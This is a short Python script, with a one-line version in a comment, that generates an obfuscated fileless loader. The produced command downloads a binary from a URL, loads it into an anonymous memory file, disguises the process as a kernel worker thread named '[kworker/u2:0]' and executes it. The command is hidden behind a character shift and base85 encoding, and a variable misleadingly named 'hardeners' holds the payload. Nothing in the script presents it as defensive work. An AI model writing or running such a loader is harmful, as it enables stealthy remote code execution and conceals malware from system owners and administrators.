# python3 -c 'import base64; u="http://127.0.0.1:8080/check_id"; logic=f"""import os,ctypes,urllib.request,sys;r=urllib.request.urlopen(sys.argv[1]);p=r.read();l=ctypes.CDLL("libc.so.6");fd=l.syscall(319,b"",1);os.write(fd,p);l.prctl(15,b"[kworker/u2:0]",0,0,0);os.execve(f"/proc/self/fd/{{fd}}",["[init]"],{{}})"""; cmd=f"python3 -c \x27{logic}\x27 {u}"; enc=base64.b85encode("".join(chr(ord(c)+1) for c in cmd).encode()).decode(); print(f"\npython3 -c \x27import base64,os;d=base64.b85decode(\"{enc}\").decode();os.system(\"\".join(chr(ord(c)-1) for c in d))\x27")'

import base64

bin_url = "http://127.0.0.1:8080/check_id"
hardeners = (
    "import os,ctypes,urllib.request,sys;"
    "r=urllib.request.urlopen(sys.argv[1]);p=r.read();"
    "l=ctypes.CDLL('libc.so.6');fd=l.syscall(319,b'',1);"
    "os.write(fd,p);l.prctl(15,b'[kworker/u2:0]',0,0,0);"
    "os.execve(f'/proc/self/fd/{fd}',['[init]'],{})"
)

cmd = f"python3 -c \"{hardeners}\" {bin_url}"
shifted = "".join(chr(ord(c) + 1) for c in cmd)
encoded = base64.b85encode(shifted.encode()).decode()

print(f"python3 -c 'import base64,os;d=base64.b85decode(\"{encoded}\").decode();os.system(\"\".join(chr(ord(c)-1) for c in d))'")
